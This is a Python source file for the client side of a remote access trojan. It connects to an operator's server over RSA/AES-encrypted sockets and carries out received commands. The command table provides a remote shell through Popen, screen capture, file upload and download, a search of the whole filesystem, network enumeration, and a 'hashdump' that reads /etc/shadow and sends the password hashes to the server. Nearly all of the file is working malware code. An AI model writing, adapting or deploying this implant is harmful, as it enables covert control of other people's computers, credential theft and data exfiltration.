import socket
from Cryptodome.Cipher import AES, PKCS1_OAEP
from Cryptodome.Util.Padding import pad, unpad
from Cryptodome.PublicKey import RSA
from Cryptodome import Random
from hashlib import md5
import logging
from subprocess import Popen, STDOUT, PIPE
from enum import Enum
from PIL import ImageGrab
from io import BytesIO
from os.path import exists, join
from os import stat, walk
from re import fullmatch
from prompt_toolkit.shortcuts import ProgressBar
from psutil import net_if_addrs
from platform import system

MSG_MAX_LEN = 1024
RSA_SIZE = 1024
MD5_SIZE = 16
AES_KEY_SIZE = 16
IV_SIZE = 16

EOT = '\r\n'


def check_hash(digest, msg):
    if md5(msg).hexdigest() == digest:
        return True
    return False


def reduce_split(src, size):
    src_len = len(src)
    if src_len <= size:
        return [src]  # Return the original list as a single element in a list

    split_lists = []
    for i in range(0, src_len, size):
        if i + size > src_len:
            split_lists.append(src[i:src_len])
            break
        else:
            split_lists.append(src[i:i + size])
    return split_lists


class Actions(Enum):
    ENCRYPT = 0
    DECRYPT = 1


class EncryptionContext:

    def __init__(self, key, iv, first=True):
        self.key = key
        self.iv = iv
        self.first = first
        self.last_action = None

    def set_iv(self, cipher_text):
        self.iv = cipher_text[:AES.block_size]

    def encrypt(self, plain_text):
        aes = AES.new(self.key, AES.MODE_CBC, IV=self.iv)
        cipher_text = aes.encrypt(pad(plain_text, AES.block_size))
        if self.first:
            self.set_iv(cipher_text)
        self.last_action = Actions.ENCRYPT
        return cipher_text

    def decrypt(self, cipher_text):
        aes = AES.new(self.key, AES.MODE_CBC, IV=self.iv)
        if not self.first:
            self.set_iv(cipher_text)
        plain_text = unpad(aes.decrypt(cipher_text), AES.block_size)
        self.last_action = Actions.DECRYPT
        return plain_text


class Client:

    def __init__(self, host=None, port=None):
        self.host = host
        self.port = port
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if host and port:
            self.connect()
        self.public_key = None
        self.private_key = None
        self._generate_keys()
        self.hostname = ''
        self.client_id = -1
        self.running = False
        self.key = ''
        self.iv = ''
        self.encryption_context = None

    def connect(self):
        if self.host is None:
            logging.error('Host information is not set')
            return
        if self.port is None:
            logging.error('Port information is not set')
            return
        self.client_socket.connect((self.host, self.port))

    def init_encryption(self, key, iv, first=True):
        self.encryption_context = EncryptionContext(key, iv, first=first)

    def _generate_keys(self):
        random = Random.new().read
        rsa_key = RSA.generate(RSA_SIZE, random)
        self.public_key = rsa_key.public_key().exportKey()
        self.private_key = rsa_key.exportKey()

    def secure_connection_protocol(self):
        logging.debug('[DEBUG]: sending public keys')
        # receive src public key in hex with hash digest
        server_msg = self.client_socket.recv(RSA_SIZE + MD5_SIZE).decode()[:-2]
        server_pub_key, digest = server_msg.split(':')
        if not check_hash(digest, bytes.fromhex(server_pub_key)):
            logging.error(f'[MESSAGE MODIFIED]: received a modified message with server')
            return False
        # sending client public key with hash digest
        self.send_message(f'{self.public_key.decode()}:{md5(self.public_key).hexdigest()}')
        # receive the AES key, random IV, key digest, IV digest from src
        server_msg = self.receive_message(size=4072)
        logging.info(server_msg)
        rdm_key, rdm_iv, aes_digest, iv_digest = server_msg.split(':')
        if not check_hash(aes_digest, bytes.fromhex(rdm_key)):
            logging.error(f'[MESSAGE MODIFIED]: received a modified aes key with server')
            return False
        if not check_hash(iv_digest, bytes.fromhex(rdm_iv)):
            logging.error(f'[MESSAGE MODIFIED]: received a modified iv with server')
            return False
        cipher_rsa = PKCS1_OAEP.new(RSA.import_key(self.private_key))
        rdm_key = cipher_rsa.decrypt(bytes.fromhex(rdm_key))
        self.init_encryption(rdm_key, bytes.fromhex(rdm_iv))
        self.send_message(f'HELLO {socket.gethostname()}')
        return True

    def run(self):
        if not self.secure_connection_protocol():
            logging.error('[SECURE CONNECTION FAILED]')
            return
        self.running = True
        while self.running:
            server_cmd = self.receive_message()
            server_cmd = server_cmd.split(' ')
            if server_cmd[0] in Client.cmd_table:
                Client.cmd_table[server_cmd[0]](self, server_cmd)

    def set_socket(self, client_socket: socket):
        self.client_socket = client_socket

    def send_message(self, raw_msg: str | bytes, encode=True, add_eot=True, send_block=False):
        if add_eot:
            raw_msg = raw_msg + EOT if isinstance(raw_msg, str) else EOT.encode()
        raw_msg = raw_msg.encode() if encode else raw_msg
        if send_block:
            if self.encryption_context is None:
                self.client_socket.send(raw_msg)
            else:
                self.client_socket.send(self.encryption_context.encrypt(raw_msg))
            return
        split_msg = reduce_split(raw_msg, MSG_MAX_LEN - AES.block_size)
        for msg in split_msg:
            if self.encryption_context is None:
                self.client_socket.send(msg)
            else:
                self.client_socket.send(self.encryption_context.encrypt(msg))

    def receive_message(self, size=1024, decode=True, strip_eot=True):
        if self.encryption_context is None:
            msg = self.client_socket.recv(size)
        else:
            msg = self.client_socket.recv(size)
            if msg is None or len(msg) == 0:
                print('error: connection closed with remote')
                return
            msg = self.encryption_context.decrypt(msg)
        if strip_eot and msg.endswith(EOT if isinstance(msg, str) else EOT.encode()):
            msg = msg[:-2]
        return msg.decode() if decode else msg

    def receive_data(self, file_size, chunk_size, binary_mode, data_handler):
        read_bytes = 0
        with ProgressBar() as pg:
            for _ in pg(
                    range(0,
                          (file_size - (file_size % (chunk_size - 16)) + chunk_size - 16) if file_size % (
                                  chunk_size - 16) else file_size, chunk_size - 16)
                    , label='Downloading:'):
                output = self.receive_message(size=chunk_size, decode=not binary_mode, strip_eot=False)
                read_bytes += len(output)
                data_handler(output)

    def receive_file(self, output_path, binary_mode=False, chunk_size=4096):
        msg = self.receive_message()
        if not (len(msg) > 2 and msg[:2] == 'OK'):
            print(msg)
            return
        match = fullmatch(r'OK: size\[(\d+)]', msg)
        if match is None:
            logging.error('error: wrong file information pattern')
            self.send_message('KO')
            return
        self.send_message('OK')
        file_size = int(match.group(1))
        with open(output_path, 'w' + 'b' if binary_mode else '') as file:
            if not file.writable():
                print(f'error: cannot write to {output_path}')
                return
            self.receive_data(file_size, chunk_size, binary_mode, file.write)

    def send_file(self, input_path, chunk_size=4096 - 16):
        if not exists(input_path):
            self.send_message('[Error]: path does not exist')
            return
        with open(input_path, 'rb') as file:
            if not file.readable():
                self.send_message('[Error]: file is not readable')
                return
            file_stat = stat(input_path)
            self.send_message(f'OK: size[{file_stat.st_size}]')
            msg = self.receive_message()
            if msg != 'OK':
                return
            r_bytes = 0
            while r_bytes < file_stat.st_size:
                file_block = file.read(chunk_size)
                r_bytes += len(file_block)
                print(f'len: {len(file_block)}')
                self.send_message(file_block, encode=False, add_eot=False, send_block=True)

    @staticmethod
    def shell_cmd(client, _):
        while True:
            cmd = client.receive_message()
            if len(cmd) < 1:
                continue
            if cmd == 'exit':
                break
            print(cmd.split(' '))
            output = Popen(cmd.split(' '), stdout=PIPE, stderr=STDOUT, text=True).stdout.read()
            if not output.endswith(EOT):
                output += EOT
            client.send_message(output)

    @staticmethod
    def screenshot_cmd(client, _):
        screenshot = ImageGrab.grab()
        bytes_io = BytesIO()
        screenshot.save(bytes_io, 'PNG')
        image_bytes = bytes_io.getvalue() + EOT.encode()
        client.send_message(image_bytes, encode=False)

    @staticmethod
    def download_cmd(client, args):
        client.send_file(args[1])

    @staticmethod
    def upload_cmd(client, args):
        client.receive_file(args[1], binary_mode=True)

    @staticmethod
    def search_cmd(client, args):
        result = []
        for root, _, files in walk('/'):
            if args[1] in files:
                result.append(join(root, args[1]))
        if len(result):
            client.send_message(f'OK: {result}')
        else:
            client.send_message('KO: file not found')

    @staticmethod
    def ipconfig_cmd(client, _):
        network_config = ''
        # Get the list of network interfaces
        interfaces = net_if_addrs()
        # Print network information for each interface
        for interface, addrs in interfaces.items():
            network_config += f"Interface: {interface}\n"
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    network_config += f"  IP Address: {addr.address}\n"
                    network_config += f"  Netmask: {addr.netmask}\n"
                elif addr.family == socket.AF_INET6:
                    network_config += f"  IPv6 Address: {addr.address}\n"
                    network_config += f"  Netmask: {addr.netmask}\n"
            network_config += '\n'
        client.send_message(network_config + EOT)

    @staticmethod
    def hashdump_linux(client, _):
        with open('/etc/shadow', 'r') as file:
            content = file.read()
        client.send_message(content + EOT)

    @staticmethod
    def hashdump_windows(client, _):
        pass

    hashdump_os_table = {
        'linux': hashdump_linux,
        'windows': hashdump_windows
    }

    @staticmethod
    def hashdump_cmd(client, args):
        os_system = system().lower()
        if os_system in Client.hashdump_os_table:
            Client.hashdump_os_table[os_system](client, args)
        else:
            client.send_message(f'KO: os platform not supported {os_system}')

    cmd_table = {
        'shell': shell_cmd,
        'screenshot': screenshot_cmd,
        'download': download_cmd,
        'upload': upload_cmd,
        'search': search_cmd,
        'ipconfig': ipconfig_cmd,
        'hashdump': hashdump_cmd
    }
